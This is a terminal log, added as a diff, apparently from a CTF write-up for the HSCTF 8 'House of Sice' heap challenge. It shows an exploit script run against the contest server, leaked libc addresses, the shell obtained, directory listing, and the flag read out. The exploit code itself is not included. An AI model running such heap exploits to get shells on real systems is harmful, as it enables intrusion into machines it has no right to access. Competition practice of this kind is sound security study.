@@ -1,0 +1,45 @@
+mito@ubuntu:~/CTF/HSCTF_8/Pwn_House_of_Sice$ python3 solve.py r
+[*] '/home/mito/CTF/HSCTF_8/Pwn_House_of_Sice/house_of_sice'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to house-of-sice.hsc.tf on port 1337: Done
+[*] '/home/mito/CTF/HSCTF_8/Pwn_House_of_Sice/libc-2.31.so'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+system_addr = 0x7f56984e9410
+libc_base   = 0x7f5698494000
+[*] Switching to interactive mode
+$ id
+uid=1000(user) gid=1000(user) groups=1000(user)
+$ ls -l
+total 60
+lrwxrwxrwx   1 nobody nogroup    7 Apr 16 05:11 bin -> usr/bin
+drwxr-xr-x   2 nobody nogroup 4096 Apr 15  2020 boot
+drwxr-xr-x   2 nobody nogroup 4096 Apr 16 05:33 dev
+drwxr-xr-x  30 nobody nogroup 4096 May 23 00:28 etc
+-rw-rw-r--   1 nobody nogroup   44 Jun 12 19:38 flag
+drwxr-xr-x   3 nobody nogroup 4096 Jun 14 23:34 home
+lrwxrwxrwx   1 nobody nogroup    7 Apr 16 05:11 lib -> usr/lib
+lrwxrwxrwx   1 nobody nogroup    9 Apr 16 05:11 lib32 -> usr/lib32
+lrwxrwxrwx   1 nobody nogroup    9 Apr 16 05:11 lib64 -> usr/lib64
+lrwxrwxrwx   1 nobody nogroup   10 Apr 16 05:11 libx32 -> usr/libx32
+drwxr-xr-x   2 nobody nogroup 4096 Apr 16 05:11 media
+drwxr-xr-x   2 nobody nogroup 4096 Apr 16 05:11 mnt
+drwxr-xr-x   2 nobody nogroup 4096 Apr 16 05:11 opt
+dr-xr-xr-x 224 nobody nogroup    0 Jun 16 04:54 proc
+drwx------   2 nobody nogroup 4096 Apr 16 05:32 root
+drwxr-xr-x   5 nobody nogroup 4096 Apr 23 22:21 run
+lrwxrwxrwx   1 nobody nogroup    8 Apr 16 05:11 sbin -> usr/sbin
+drwxr-xr-x   2 nobody nogroup 4096 Apr 16 05:11 srv
+drwxr-xr-x   2 nobody nogroup 4096 Apr 15  2020 sys
+drwxrwxrwt   2 nobody nogroup 4096 Apr 16 05:33 tmp
+drwxr-xr-x  13 nobody nogroup 4096 Apr 16 05:11 usr
+drwxr-xr-x  11 nobody nogroup 4096 Apr 16 05:32 var
+$ cat flag
+flag{tfw_the_double_free_check_still_sucks}
